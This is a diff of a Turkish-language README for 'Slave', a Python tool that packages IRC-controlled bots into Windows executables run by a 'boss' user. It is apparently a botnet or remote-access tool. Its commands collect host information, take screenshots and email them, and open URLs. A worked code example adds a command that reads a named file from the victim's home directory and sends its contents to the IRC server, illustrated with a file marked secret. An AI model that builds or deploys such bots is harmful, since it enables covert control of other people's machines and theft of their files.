@@ -1,19 +1,32 @@
 # SLAVE
 
-Slave, Python ile yazılmış özelleştirilebilir bot oluşturan bir yazılımdır. [IRC](https://tr.wikipedia.org/wiki/Internet_Relay_Chat) protokolü üzerinden, yazılan botlar ile haberleşir.
+Slave, Python ile yazılmış özelleştirilebilir bot oluşturmaya yarayan bir yazılımdır. [IRC](https://tr.wikipedia.org/wiki/Internet_Relay_Chat) protokolü üzerinden, yazılan botlar ile haberleşir.
 
-## Nasıl kullanılır
+## Yükleme
+### Pip ile kurulum
+----
+```bash
+$ pip install slave-irc
+```
+### Local kurulum
+---
 ```bash
 $ git clone https://github.com/bufgix/slave
 $ cd slave
+$ python setup.py install
 ```
 
 Slave, gerek executable dosya oluşturmada gerekse bağımlıklıları kurmada `pipenv` i kullanır. `pipenv` hakkında daha fazla bilgiye [buradan](https://realpython.com/pipenv-guide/) ulaşabilirsiniz.
 
-`pipenv` i kurup, bağımlılıkları yükleyip, virtual env'e geçtikten sonra `bot.py` dosyasını açın. İçeriği aşağıdaki gibidir.
+
+## Kullanım
+### Basit bot oluşturma
+---
 ```python
-# bot.py
-from slave.lib.bots import BotBasic
+# basic_bot.py
+
+from slave.lib.bot import BotV2
+
 
 config = {
     'host': 'chat.freenode.net',
@@ -22,27 +35,37 @@ config = {
     'boss_name': 'boss666',
     'bot_prefix': "SLAVEBOT"
 }
-BotBasic.read_config_from_dict(config)
-
-## Write custom commands here
-
-
-BotBasic.start()
+BotV2.read_config_from_dict(config)
+BotV2.start()
 ```
-Buradan sonra eğer botunuza özel komutlar eklemiyecekseniz executable dosyasını oluşturabilirsiniz. 
 
+`config` şunları içermelidir
+| Key | Value |
+|---|---|
+| `host` | IRC server (varsayılan `chat.freenode.net`) |
+| `port` |  IRC server portu (varsayılan `6667`)|
+| `channel`| Bağlanılacak kanal ismi. (varsayılan `#slavebotpool666`)|
+| `boss_name` | Botları yönetecek kullanıcın ismi (varsayılan `boss666`) |
+| `bot_prefix`| Bot ön eki (varsayılan `SLAVEBOT`) |
+
+## Çalıştırılabilir dosya oluşturma
+---
+Slave, direkt olarak çalıştırabilir dosya oluşturmanıza olanak sağlar. Bunu yaparlen [PyInstaller](https://www.pyinstaller.org) kullanır.
+
+Yukarıda yazdığımız botu çalıştırılabilir dosya yapmak için:
 ```bash
-(venv) $ python -m slave bot.py
-[i] Source: C:\Users\user\path\slave\bot.py
+$ python slave basic_bot.py
+[i] Source: C:\Users\user\your_bot\basic_bot.py
 [i] Creating executable file...
-[*] Created executable file. Check C:\Users\user\path\slave\dist
+[*] Created executable file. Check C:\Users\user\path\your_bot\dist
 ```
 
-Oluşan `dist/` dizinini altında `bot.exe` dosyası artık kullanıma hazır.
+Oluşan `dist/` dizinini altında `basic_bot.exe` dosyası artık kullanıma hazır.
 
-`bot.exe` yi çalıştırdıktan sonra 5-10 saniye içinde `config` de belirlediğiniz şekilde IRC'ye bağlanır.
+`basic_bot.exe` yi çalıştırdıktan sonra 5-10 saniye içinde `config` de belirlediğiniz şekilde IRC'ye bağlanır.
 
 ## Nasıl komut vereceksiniz
+---
 Slave botlarına emir vermek için `$` ön eki getirilir.
 ```
 $info bfr24s
@@ -57,28 +80,37 @@ gibi. Komuttan sonraki ilk parametre genelde vereceğiniz botun idsini alır. E�
 $visit /all https://google.com
 ```
 
-Standart komutlar ve kullanımları aşağıdaki gibidir
-```
-quit: Kill bot -- Usage: $quit [/all | <bot_id>]
-info: Information of bot machine -- Usage: $info [/all | <bot_id>]
-message: Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>
-visit: Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>
-help: Help text of command -- Usage: $help <bot_id> <cmd>
-```
+`BOtV2` nin sağladığı komutlar ve kullanımları aşağıdaki gibidir
+| Command |  Desc | Syntax  |
+|---|---|---|
+| quit  | Kill bot  | `$quit [/all | <bot_id>]`  |
+|  info |  Information of bot machine  | `$info [/all | <bot_id>]`  |
+| message | Message show with tkinter  |  `$message [/all | <bot_id>] <message> <msec>` |
+| visit  | Open url with webbroser  | `$visit [/all | <bot_id>] <url>` |
+| screenshot  | Take sceenshot and send your email(Only Gmail)  | `$screenshot [/all | <bot_id>] <email> <password>`|
+| help | Help text of command  |  `$help <bot_id> <cmd>` |
+
+
 
 Buradan sonra `config` de belirlediğiniz `bos_name` ile aynı olarak IRC server ve channel'e girin. Ardından botlarınıza emir vermeye başlayabilirsiniz.
 
+Botlarınızı her yerden yönetebilirsiniz
+* Web: [Kiwi](https://kiwiirc.com/nextclient/)
+* Android: [AndroidIRC](https://play.google.com/store/apps/details?id=com.androirc&hl=tr)
+* IOS: [Mutter](https://apps.apple.com/tr/app/mutter-irc-client/id1059224189?l=tr)
+
 
 ## Nasıl kendi komutlarımı yazarım ?
-Slave, kendi özel botunuzu yazmanızı sağlar. Bunu yapmak için `BotBasic` sınıfının `@register` decelerator'unu kullanmanız gerekir.
+Slave, kendi özel botunuzu yazmanızı sağlar. Bunu yapmak için `Bot` sınıfının `@register` decelerator'unu kullanmanız gerekir.
 
 Şimdi kendimiz bir komut yazalım. Yazacağımız komut argüman olarak verdiğimiz dosya ismini okuyup içindekileri servera göndersin. Komutun söz dizimi şöyle olsun.
 ```
 $read [/all | <bot_id>] <file_name>
 ```
 
-`app.py` dosyasını açalım. Komutları `.start()` komutundan önce yazmanız yeterli.
 ```python
+# bot_custom.py
+
 from slave.lib.bots import BotBasic
 
 config = {
@@ -89,8 +121,8 @@ config = {
     'bot_prefix': "SLAVEBOT"
 }
 BotBasic.read_config_from_dict(config)
+BotBasic.bot_type = "MyCustomBot"
 
-## Write custom commands here
 @BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
 def read_file(bot, args):
     pass
@@ -122,25 +154,45 @@ Var olan komutları ve bilgilerini servera gönderir.
 ```python
 from pathlib import Path
 
+...
+
 @BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
 def read_file(bot, args):
     path = str(Path(f"~/{args[1]}").expanduser())
     with open(path, 'r') as f:
         bot.send_text(f.read())
+
+...
+
 ```
 
-şimdi test etmek için `bot.py` yi çalıştırabiliriz.
-```python
-(venv) $ python bot.py
+Her şey hazır. Şimdi test etmek için `bot_custom.py` yi çalıştırabiliriz.
+```bash
+$ python bot_custom.py
 ```
 `file.txt`
 ```
-Hey. Im a bot
+Im secret
+Don't read me
 ```
 
-![img](https://i.resimyukle.xyz/e2M0Ge.png)
+![img](https://www.coogger.com/media/images/mr.PNG)
 
 Tabi dosyayı okumdadan önce var olup olmadığını kontrol etmek önemlidir. Eğer var olmayan bir dosyaya erişmeye çalışırsanız bot, serverla haberleşmeyi kesecektir.
 
+
+Yukardaki örnekte daha az komut olduğunu görmüşsünüzdür. Bunun nedeni `BotBasic` sınıfının `BotV2` ye göre daha az komut içermesi. Hem kendi komutlarınızı hem de `BotV2` deki standart komutları birleştirmek için
+```python
+from slave.lib.bots import BotBasic, BotV2
+
+...
+
+BotBasic.use_other_bot_commands(BotV2)
+BotBasic.start()
+```
+
+![img](https://www.coogger.com/media/images/custom.PNG)
+
+## LICENSE: [MIT](https://github.com/bufgix/slave/blob/master/LICENSE)
 
 
